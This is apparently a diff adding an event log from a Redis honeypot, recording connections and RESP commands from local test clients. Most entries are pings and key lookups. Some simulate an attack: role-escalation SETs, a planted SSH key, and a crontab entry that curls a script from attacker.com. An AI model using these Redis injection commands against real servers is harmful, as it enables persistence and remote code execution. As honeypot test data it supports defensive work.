@@ -1,0 +1,370 @@
+
+{"event": "started", "time": "2025-12-05T14:36:07.284175Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "connect", "time": "2025-12-05T14:36:20.116611Z", "ip": "172.18.0.1"}
+{"event": "command", "time": "2025-12-05T14:36:20.116726Z", "ip": "172.18.0.1", "cmd": "*1\r\n$3\r\ntes"}
+{"event": "connect", "time": "2025-12-05T14:36:20.986322Z", "ip": "172.18.0.1"}
+{"event": "command", "time": "2025-12-05T14:36:20.986413Z", "ip": "172.18.0.1", "cmd": "*1\r\n$3\r\ntes"}
+{"event": "connect", "time": "2025-12-05T14:43:59.976637Z", "ip": "172.18.0.1"}
+{"event": "command", "time": "2025-12-05T14:43:59.980161Z", "ip": "172.18.0.1", "cmd": "*2\r\n$5\r\ntouch\r\n$3\r\nfab"}
+{"event": "connect", "time": "2025-12-05T14:44:03.210315Z", "ip": "172.18.0.1"}
+{"event": "command", "time": "2025-12-05T14:44:03.210418Z", "ip": "172.18.0.1", "cmd": "*2\r\n$5\r\ntouch\r\n$4\r\ntroy"}
+{"event": "connect", "time": "2025-12-05T14:53:53.324779Z", "ip": "172.18.0.1"}
+{"event": "command", "time": "2025-12-05T14:53:53.325199Z", "ip": "172.18.0.1", "cmd": "*2\r\n$5\r\ntouch\r\n$4\r\ntroy"}
+{"event": "started", "time": "2025-12-05T15:19:32.682095Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "connect", "time": "2025-12-05T15:20:29.104422Z", "ip": "172.18.0.1"}
+{"event": "command", "time": "2025-12-05T15:20:29.116755Z", "ip": "172.18.0.1", "cmd": "*1\r\n$3\r\ntes"}
+{"event": "connect", "time": "2025-12-05T15:20:33.405233Z", "ip": "172.18.0.1"}
+{"event": "command", "time": "2025-12-05T15:20:33.405580Z", "ip": "172.18.0.1", "cmd": "*1\r\n$3\r\ntes"}
+{"event": "connect", "time": "2025-12-05T15:21:26.751529Z", "ip": "172.18.0.1"}
+{"event": "command", "time": "2025-12-05T15:21:26.751915Z", "ip": "172.18.0.1", "cmd": "*1\r\n$3\r\ntes"}
+{"event": "connect", "time": "2025-12-05T15:22:06.019559Z", "ip": "172.18.0.1"}
+{"event": "command", "time": "2025-12-05T15:22:06.020499Z", "ip": "172.18.0.1", "cmd": "*1\r\n$3\r\ntes"}
+{"event": "started", "time": "2025-12-05T16:02:51.286680Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "connect", "time": "2025-12-05T16:04:13.671515Z", "ip": "172.18.0.1"}
+{"event": "command", "time": "2025-12-05T16:04:13.674497Z", "ip": "172.18.0.1", "cmd": "*2\r\n$5\r\ntouch\r\n$4\r\ntroy"}
+{"event": "connect", "time": "2025-12-05T16:04:14.594694Z", "ip": "172.18.0.1"}
+{"event": "command", "time": "2025-12-05T16:04:14.595094Z", "ip": "172.18.0.1", "cmd": "*2\r\n$5\r\ntouch\r\n$4\r\ntroy"}
+{"event": "connect", "time": "2025-12-05T16:05:07.248938Z", "ip": "172.18.0.1"}
+{"event": "command", "time": "2025-12-05T16:05:07.249567Z", "ip": "172.18.0.1", "cmd": "*2\r\n$5\r\ntouch\r\n$4\r\ntroy"}
+{"event": "started", "time": "2025-12-05T16:15:27.208828Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "connect", "time": "2025-12-05T16:16:31.919762Z", "ip": "172.18.0.1"}
+{"event": "command", "time": "2025-12-05T16:16:31.923568Z", "ip": "172.18.0.1", "cmd": "*1\r\n$3\r\ntes"}
+{"event": "connect", "time": "2025-12-05T16:16:32.951526Z", "ip": "172.18.0.1"}
+{"event": "command", "time": "2025-12-05T16:16:32.952385Z", "ip": "172.18.0.1", "cmd": "*1\r\n$3\r\ntes"}
+{"event": "connect", "time": "2025-12-05T16:16:59.199811Z", "ip": "172.18.0.1"}
+{"event": "command", "time": "2025-12-05T16:16:59.200247Z", "ip": "172.18.0.1", "cmd": "*1\r\n$3\r\nget"}
+{"event": "connect", "time": "2025-12-05T16:37:12.309929Z", "ip": "172.18.0.1"}
+{"event": "command", "time": "2025-12-05T16:37:12.324469Z", "ip": "172.18.0.1", "cmd": "*1\r\n$4\r\nmake"}
+{"event": "connect", "time": "2025-12-06T01:01:18.702141Z", "ip": "172.18.0.1"}
+{"event": "command", "time": "2025-12-06T01:01:18.702598Z", "ip": "172.18.0.1", "cmd": "*1\r\n$3\r\ntes"}
+{"event": "connect", "time": "2025-12-06T01:01:21.042351Z", "ip": "172.18.0.1"}
+{"event": "command", "time": "2025-12-06T01:01:21.043818Z", "ip": "172.18.0.1", "cmd": "*1\r\n$3\r\nfab"}
+{"event": "connect", "time": "2025-12-06T01:01:23.302640Z", "ip": "172.18.0.1"}
+{"event": "command", "time": "2025-12-06T01:01:23.303323Z", "ip": "172.18.0.1", "cmd": "*1\r\n$4\r\ntroy"}
+{"event": "started", "time": "2025-12-06T01:23:30.336846Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "started", "time": "2025-12-06T01:34:04.628952Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "started", "time": "2025-12-06T01:59:03.339952Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "connect", "time": "2025-12-06T01:59:13.325729Z", "ip": "172.18.0.1"}
+{"event": "command", "time": "2025-12-06T01:59:13.326122Z", "ip": "172.18.0.1", "cmd": "*1\r\n$4\r\ntroy"}
+{"event": "connect", "time": "2025-12-06T01:59:14.064647Z", "ip": "172.18.0.1"}
+{"event": "command", "time": "2025-12-06T01:59:14.064775Z", "ip": "172.18.0.1", "cmd": "*1\r\n$4\r\ntroy"}
+{"event": "started", "time": "2025-12-06T02:20:18.275400Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "connect", "time": "2025-12-06T02:20:45.435742Z", "ip": "172.18.0.1"}
+{"event": "command", "time": "2025-12-06T02:20:45.438449Z", "ip": "172.18.0.1", "cmd": "*1\r\n$3\r\nget"}
+{"event": "started", "time": "2025-12-06T02:29:53.895171Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "started", "time": "2025-12-06T02:41:22.124064Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "connect", "time": "2025-12-06T02:42:30.166896Z", "ip": "172.18.0.1"}
+{"event": "command", "time": "2025-12-06T02:42:30.185184Z", "ip": "172.18.0.1", "cmd": "*1\r\n$3\r\nget"}
+{"event": "connect", "time": "2025-12-06T03:09:49.188458Z", "ip": "172.18.0.1"}
+{"event": "command", "time": "2025-12-06T03:09:49.199570Z", "ip": "172.18.0.1", "cmd": "*1\r\n$3\r\noit"}
+{"event": "started", "time": "2025-12-06T03:19:35.648280Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "started", "time": "2025-12-06T03:36:50.161574Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "started", "time": "2025-12-06T03:48:50.810213Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "started", "time": "2025-12-06T04:01:45.348533Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "started", "time": "2025-12-06T04:10:59.263894Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "connect", "time": "2025-12-06T04:11:07.120385Z", "ip": "172.18.0.1"}
+{"event": "command", "time": "2025-12-06T04:11:07.121850Z", "ip": "172.18.0.1", "cmd": "*1\\r\\n$3\\r\\nget"}
+{"event": "started", "time": "2025-12-06T04:20:51.139398Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "connect", "time": "2025-12-06T04:22:08.599759Z", "ip": "172.18.0.1"}
+{"event": "command", "time": "2025-12-06T04:22:08.605812Z", "ip": "172.18.0.1", "cmd": "*1\\r\\n$3\\r\\nget"}
+{"event": "connect", "time": "2025-12-06T04:22:09.252163Z", "ip": "172.18.0.1"}
+{"event": "command", "time": "2025-12-06T04:22:09.252584Z", "ip": "172.18.0.1", "cmd": "*1\\r\\n$3\\r\\nget"}
+{"event": "started", "time": "2025-12-06T04:28:11.865329Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "connect", "time": "2025-12-06T04:29:21.905438Z", "ip": "172.18.0.1"}
+{"event": "command", "time": "2025-12-06T04:29:21.906669Z", "ip": "172.18.0.1", "cmd": "*1\\r\\n$5\\r\\nhello"}
+{"event": "connect", "time": "2025-12-06T04:38:17.277474Z", "ip": "172.18.0.1"}
+{"event": "command", "time": "2025-12-06T04:38:17.296267Z", "ip": "172.18.0.1", "cmd": "*1\\r\\n$5\\r\\nhello"}
+{"event": "started", "time": "2025-12-06T04:42:39.141963Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "connect", "time": "2025-12-06T04:43:08.978520Z", "ip": "172.18.0.1"}
+{"event": "command", "time": "2025-12-06T04:43:08.982755Z", "ip": "172.18.0.1", "cmd": "*1\\r\\n$4\\r\\nping"}
+{"event": "connect", "time": "2025-12-06T04:43:35.926598Z", "ip": "172.18.0.1"}
+{"event": "command", "time": "2025-12-06T04:43:35.927367Z", "ip": "172.18.0.1", "cmd": "*1\\r\\n$4\\r\\nping"}
+{"event": "started", "time": "2025-12-06T04:55:53.874539Z", "cmd_b64": "UmVkaXMgaG9uZXlwb3QgbGlzdGVuaW5nIG9uIDYzNzk="}
+{"event": "connect", "time": "2025-12-06T04:59:34.577331Z", "ip": "172.18.0.1"}
+{"event": "command", "time": "2025-12-06T04:59:34.596369Z", "ip": "172.18.0.1", "cmd_b64": "KjENCiQ0DQpwaW5n"}
+{"event": "started", "time": "2025-12-06T05:23:27.493803Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "connect", "time": "2025-12-06T05:24:11.092450Z", "ip": "172.18.0.1"}
+{"event": "command", "time": "2025-12-06T05:24:11.109062Z", "ip": "172.18.0.1", "cmd": "*1\\r\\n$4\\r\\nping"}
+{"event": "connect", "time": "2025-12-06T06:28:45.740288Z", "ip": "172.18.0.1"}
+{"event": "command", "time": "2025-12-06T06:28:45.754525Z", "ip": "172.18.0.1", "cmd": "*1\\r\\n$4\\r\\nping"}
+{"event": "started", "time": "2025-12-06T06:31:57.516946Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "connect", "time": "2025-12-06T06:32:53.129186Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-06T06:32:53.145582Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$3\\r\\ntes"}
+{"event": "started", "time": "2025-12-06T06:40:59.275596Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "connect", "time": "2025-12-06T06:41:37.586901Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-06T06:41:37.592222Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$3\\r\\ntes"}
+{"event": "started", "time": "2025-12-06T06:50:16.297627Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "connect", "time": "2025-12-06T06:51:04.431708Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-06T06:51:04.435155Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$3\\r\\ntes"}
+{"event": "started", "time": "2025-12-06T06:57:04.204521Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "connect", "time": "2025-12-06T06:57:31.067816Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-06T06:57:31.085620Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$3\\r\\ntes"}
+{"event": "connect", "time": "2025-12-06T07:56:44.468427Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-06T07:56:44.478761Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$4\\r\\nping"}
+{"event": "started", "time": "2025-12-06T08:09:14.964840Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "started", "time": "2025-12-06T08:17:02.453336Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "started", "time": "2025-12-06T08:32:01.087785Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "started", "time": "2025-12-06T08:58:14.960361Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "connect", "time": "2025-12-06T09:01:05.489501Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-06T09:01:05.496349Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$4\\r\\nping"}
+{"event": "started", "time": "2025-12-06T09:08:54.065377Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "started", "time": "2025-12-06T09:17:00.560642Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "started", "time": "2025-12-06T09:26:11.894023Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "started", "time": "2025-12-06T09:38:19.355467Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "connect", "time": "2025-12-06T09:38:44.420845Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-06T09:38:44.421091Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$5\\r\\npings"}
+{"event": "connect", "time": "2025-12-06T09:43:28.143298Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-06T09:43:28.155770Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$4\\r\\nFAB1"}
+{"event": "connect", "time": "2025-12-06T09:52:34.593052Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-06T09:52:34.599681Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$6\\r\\ntes123"}
+{"event": "connect", "time": "2025-12-06T09:55:34.459997Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-06T09:55:34.460619Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nset\\r\\n$4\\r\\ntest\\r\\n$3\\r\\n123"}
+{"event": "connect", "time": "2025-12-06T10:06:56.568527Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-06T10:06:56.579856Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$5\\r\\ninfos"}
+{"event": "connect", "time": "2025-12-06T14:04:07.280836Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-06T14:04:07.296426Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$5\\r\\ninfo1"}
+{"event": "started", "time": "2025-12-06T15:17:29.331915Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "connect", "time": "2025-12-06T15:17:50.892295Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-06T15:17:50.893775Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$4\\r\\nINFO\\r\\n"}
+{"event": "connect", "time": "2025-12-07T02:02:35.737192Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-07T02:02:35.750648Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$3\\r\\nGET\\r\\n"}
+{"event": "connect", "time": "2025-12-07T02:34:07.986372Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-07T02:34:08.002074Z", "ip": "172.19.0.1", "cmd": "*11\\r\\n$4\\r\\nKEYS\\r\\n$7\\r\\nDesktop\\r\\n$9\\r\\nDocuments\\r\\n$9\\r\\nDownloads\\r\\n$5\\r\\nMusic\\r\\n$8\\r\\nPictures\\r\\n$7\\r\\nproject\\r\\n$6\\r\\nPublic\\r\\n$4\\r\\nsnap\\r\\n$9\\r\\nTemplates\\r\\n$6\\r\\nVideos\\r\\n"}
+{"event": "connect", "time": "2025-12-07T02:34:35.376729Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-07T02:34:35.392626Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$3\\r\\nGET\\r\\n$13\\r\\nconfig:secret\\r\\n"}
+{"event": "connect", "time": "2025-12-07T02:34:49.101906Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-07T02:34:49.102453Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$3\\r\\nGET\\r\\n$9\\r\\nuser:1001\\r\\n"}
+{"event": "connect", "time": "2025-12-07T02:35:10.603688Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-07T02:35:10.605514Z", "ip": "172.19.0.1", "cmd": "*4\\r\\n$3\\r\\nSET\\r\\n$9\\r\\nuser:1001\\r\\n$10\\r\\nname:alice\\r\\n$15\\r\\nrole:superadmin\\r\\n"}
+{"event": "connect", "time": "2025-12-07T05:04:47.754871Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-07T05:04:47.777772Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$4\\r\\nping\\r\\n"}
+{"event": "connect", "time": "2025-12-07T05:05:15.071157Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-07T05:05:15.071317Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$17\\r\\nping_from_windows\\r\\n"}
+{"event": "connect", "time": "2025-12-07T05:08:59.334527Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-07T05:08:59.360227Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$20\\r\\nping_from_silverwolf\\r\\n"}
+{"event": "connect", "time": "2025-12-07T05:09:38.757644Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-07T05:09:38.757797Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$17\\r\\nping_from_Xeondev\\r\\n"}
+{"event": "connect", "time": "2025-12-07T05:09:41.808165Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-07T05:09:41.808279Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$13\\r\\nping_from_nvg\\r\\n"}
+{"event": "connect", "time": "2025-12-07T05:09:45.135135Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-07T05:09:45.135286Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$17\\r\\nping_from_Hulinap\\r\\n"}
+{"event": "connect", "time": "2025-12-07T05:10:08.520000Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-07T05:10:08.534587Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$18\\r\\nping_from_Lycurgus\\r\\n"}
+{"event": "connect", "time": "2025-12-07T05:11:31.377041Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-07T05:11:31.381851Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$4\\r\\nKEYS\\r\\n$1\\r\\n*\\r\\n"}
+{"event": "connect", "time": "2025-12-07T07:01:49.838923Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-07T07:01:49.845317Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$4\\r\\nINFO\\r\\n"}
+{"event": "connect", "time": "2025-12-07T13:28:30.716562Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-07T13:28:30.725247Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$8\\r\\nssh:keys\\r\\n$34\\r\\nssh-ed25519 AAAAC3NzaFAKEATTACKKEY\\r\\n"}
+{"event": "connect", "time": "2025-12-07T13:32:05.032542Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-07T13:32:05.033164Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$5\\r\\nping1\\r\\n"}
+{"event": "connect", "time": "2025-12-07T13:33:54.138758Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-07T13:33:54.139761Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$5\\r\\nping1\\r\\n"}
+{"event": "connect", "time": "2025-12-07T13:34:38.657366Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-07T13:34:38.667052Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$4\\r\\nKEYS\\r\\n$1\\r\\n*\\r\\n"}
+{"event": "connect", "time": "2025-12-07T13:35:07.934938Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-07T13:35:07.935123Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$3\\r\\nGET\\r\\n$14\\r\\nsession:3fa2ee\\r\\n"}
+{"event": "connect", "time": "2025-12-07T13:40:58.351041Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-07T13:40:58.353637Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$7\\r\\ncrontab\\r\\n$47\\r\\n*/1 * * * * /bin/bash -c curl attacker.com/x.sh\\r\\n"}
+{"event": "connect", "time": "2025-12-07T13:41:23.615849Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-07T13:41:23.616066Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$7\\r\\ncrontab\\r\\n$48\\r\\n*/1 * * * * /bin/bash -c 'curl attacker.com/x.sh\\r\\n"}
+{"event": "connect", "time": "2025-12-07T13:41:58.808577Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-07T13:41:58.810499Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$4\\r\\nINFO\\r\\n"}
+{"event": "connect", "time": "2025-12-07T13:42:08.460264Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-07T13:42:08.462654Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$4\\r\\nKEYS\\r\\n$7\\r\\n*shell*\\r\\n"}
+{"event": "connect", "time": "2025-12-07T13:43:09.442131Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-07T13:43:09.442586Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$9\\r\\nuser:2002\\r\\n$29\\r\\n{\"name\":\"evil\",\"role\":\"root\"}\\r\\n"}
+{"event": "connect", "time": "2025-12-08T01:13:59.080968Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T01:13:59.086601Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$4\\r\\nINFO\\r\\n"}
+{"event": "connect", "time": "2025-12-08T01:27:51.130623Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T01:27:51.134842Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$3\\r\\nGET\\r\\n"}
+{"event": "connect", "time": "2025-12-08T03:08:24.399320Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T03:08:24.407306Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$4\\r\\nINFO\\r\\n"}
+{"event": "connect", "time": "2025-12-08T03:18:40.465995Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T03:18:40.466138Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$4\\r\\nINFO\\r\\n"}
+{"event": "connect", "time": "2025-12-08T07:33:54.919325Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T07:33:54.943428Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$5\\r\\nKEYS*\\r\\n"}
+{"event": "connect", "time": "2025-12-08T07:34:05.888348Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T07:34:05.896810Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$3\\r\\nKEY\\r\\n$1\\r\\n*\\r\\n"}
+{"event": "connect", "time": "2025-12-08T07:34:11.059567Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T07:34:11.059702Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$4\\r\\nKEYS\\r\\n$1\\r\\n*\\r\\n"}
+{"event": "connect", "time": "2025-12-08T07:35:00.460545Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T07:35:00.461224Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$20\\r\\nping_from_silverwold\\r\\n"}
+{"event": "connect", "time": "2025-12-08T07:35:24.565281Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T07:35:24.565449Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$17\\r\\nping_from_Xeondev\\r\\n"}
+{"event": "connect", "time": "2025-12-08T07:49:23.696938Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T07:49:23.698619Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$4\\r\\nKEYS\\r\\n$1\\r\\n*\\r\\n"}
+{"event": "connect", "time": "2025-12-08T07:49:42.799382Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T07:49:42.809180Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$3\\r\\nGET\\r\\n$13\\r\\nconfig:secret\\r\\n"}
+{"event": "connect", "time": "2025-12-08T07:50:01.666391Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T07:50:01.676331Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$3\\r\\nGET\\r\\n$9\\r\\nuser:1001\\r\\n"}
+{"event": "connect", "time": "2025-12-08T07:52:55.417077Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T07:52:55.426987Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$4\\r\\nINFO\\r\\n"}
+{"event": "connect", "time": "2025-12-08T07:53:11.266551Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T07:53:11.275909Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$4\\r\\nKEYS\\r\\n$7\\r\\n*shell*\\r\\n"}
+{"event": "connect", "time": "2025-12-08T07:53:49.305078Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T07:53:49.305226Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$3\\r\\nGET\\r\\n$14\\r\\nsession:3fa2ee\\r\\n"}
+{"event": "connect", "time": "2025-12-08T07:55:01.705744Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T07:55:01.708023Z", "ip": "172.19.0.1", "cmd": "*4\\r\\n$3\\r\\nSET\\r\\n$9\\r\\nuser:1001\\r\\n$10\\r\\nname:alice\\r\\n$15\\r\\nrole:superadmin\\r\\n"}
+{"event": "connect", "time": "2025-12-08T07:56:58.517644Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T07:56:58.523591Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$9\\r\\nuser:1001\\r\\n$28\\r\\n{name:alice,role:superadmin}\\r\\n"}
+{"event": "connect", "time": "2025-12-08T08:00:45.915258Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T08:00:45.915411Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$9\\r\\nuser:2002\\r\\n$22\\r\\n{name:fabio,role:root}\\r\\n"}
+{"event": "connect", "time": "2025-12-08T08:01:31.157836Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T08:01:31.168106Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$3\\r\\nGET\\r\\n$9\\r\\nuser:2002\\r\\n"}
+{"event": "connect", "time": "2025-12-08T08:01:59.327716Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T08:01:59.327868Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$3\\r\\nGET\\r\\n$9\\r\\nuser:1001\\r\\n"}
+{"event": "connect", "time": "2025-12-08T08:02:30.569283Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T08:02:30.579076Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$9\\r\\nuser:1001\\r\\n$23\\r\\n{name:troy,role:admin1}\\r\\n"}
+{"event": "connect", "time": "2025-12-08T08:02:33.593382Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T08:02:33.603161Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$3\\r\\nGET\\r\\n$9\\r\\nuser:1001\\r\\n"}
+{"event": "connect", "time": "2025-12-08T08:04:14.535662Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T08:04:14.545830Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$3\\r\\nGET\\r\\n$9\\r\\nuser:1001\\r\\n"}
+{"event": "connect", "time": "2025-12-08T08:07:37.544862Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T08:07:37.554601Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$9\\r\\nuser:1001\\r\\n$26\\r\\n{name:Fab,role:superadmin}\\r\\n"}
+{"event": "connect", "time": "2025-12-08T08:07:39.682499Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T08:07:39.692778Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$3\\r\\nGET\\r\\n$9\\r\\nuser:1001\\r\\n"}
+{"event": "connect", "time": "2025-12-08T08:30:48.010792Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T08:30:48.031047Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$9\\r\\nuser:1001\\r\\n$35\\r\\n'{name:SilverWolf,role:superadmin}'\\r\\n"}
+{"event": "connect", "time": "2025-12-08T08:30:54.307485Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T08:30:54.308439Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$9\\r\\nuser:1001\\r\\n$27\\r\\n'{name:Xeondev,role:admin}'\\r\\n"}
+{"event": "connect", "time": "2025-12-08T08:31:05.693068Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T08:31:05.693249Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$9\\r\\nuser:1001\\r\\n$20\\r\\n'{name:nvg,role::D}'\\r\\n"}
+{"event": "connect", "time": "2025-12-08T08:34:45.073135Z", "ip": "172.19.0.1"}
